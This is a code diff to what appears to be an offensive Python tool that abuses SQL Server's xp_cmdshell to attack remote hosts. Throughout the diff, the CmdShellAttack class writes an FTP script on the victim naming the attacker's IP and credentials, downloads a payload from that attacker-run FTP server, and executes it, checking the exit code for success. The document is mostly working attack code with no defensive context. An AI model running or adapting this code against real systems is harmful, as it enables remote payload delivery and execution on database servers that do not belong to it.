@@ -11,7 +11,7 @@ import consts
 import ftp_server
 
 
-class AttackHost:
+class AttackHost(object):
     """
         This class acts as an interface for the attacking methods class
 
@@ -55,14 +55,14 @@ class CmdShellAttack(AttackHost):
         """
 
         # Sets up the cmds to run
-        shellcmd1 = """xp_cmdshell "mkdir c:\\tmp& chdir c:\\tmp& echo open {0} {1}>ftp.txt&
-        echo {2} >> ftp.txt" """.format(self.attacker_ip, consts.FTP_SERVER_PORT, consts.FTP_SERVER_USER)
-        shellcmd2 = """xp_cmdshell "chdir c:\\tmp& echo {0} >> ftp.txt" """.format(consts.FTP_SERVER_PASSWORD)
+        shellcmd1 = """xp_cmdshell "mkdir c:\\tmp& chdir c:\\tmp& echo open {0} {1}>ftp.txt& \
+        echo {2}>>ftp.txt" """.format(self.attacker_ip, consts.FTP_SERVER_PORT, consts.FTP_SERVER_USER)
+        shellcmd2 = """xp_cmdshell "chdir c:\\tmp& echo {0}>>ftp.txt" """.format(consts.FTP_SERVER_PASSWORD)
 
-        shellcmd3 = """xp_cmdshell "chdir c:\\tmp& echo get {0} >> ftp.txt& echo bye >> ftp.txt&
-         ftp - s:ftp.txt" """.format(self.payload_path)
-
-        shellcmds = [shellcmd1, shellcmd2, shellcmd3]
+        shellcmd3 = """xp_cmdshell "chdir c:\\tmp& echo get {0}>>ftp.txt& echo bye>>ftp.txt" """\
+            .format(self.payload_path)
+        shellcmd4 = """xp_cmdshell "chdir c:\\tmp& cmd /c ftp -s:ftp.txt" """
+        shellcmds = [shellcmd1, shellcmd2, shellcmd3, shellcmd4]
 
         # Checking to see if ftp server is up
         if self.ftp_server_p and self.ftp_server:
@@ -73,6 +73,7 @@ class CmdShellAttack(AttackHost):
                     self.cursor.execute(cmd)
             except Exception, e:
                 logging.error('Error sending the payload using xp_cmdshell to host: {0}'.format(e.message))
+                self.ftp_server_p.terminate()
                 return False
             return True
         else:
@@ -92,15 +93,15 @@ class CmdShellAttack(AttackHost):
         payload_file_name = os.path.split(self.payload_path)[1]
 
         # Preparing the cmd to run on remote, using no_output so i can capture exit code: 0 -> success, 1 -> error.
-        shellcmd = """DECLARE @i INT
-                      EXEC @i=xp_cmdshell "C:\\tmp\\{0}", no_output
+        shellcmd = """DECLARE @i INT \
+                      EXEC @i=xp_cmdshell "chdir C:\\& C:\\tmp\\{0}", no_output \
                       SELECT @i """.format(payload_file_name)
 
         try:
             # Executing payload on remote host
             logging.debug('Starting execution process of payload: {0} on remote host'.format(payload_file_name))
             self.cursor.execute(shellcmd)
-            if self.cursor.fetchone()[0] == 0:
+            if self.cursor.fetchall()[0][0] == 0:
                 # Success
                 self.ftp_server_p.terminate()
                 logging.debug('Payload: {0} execution on remote host was a success'.format(payload_file_name))
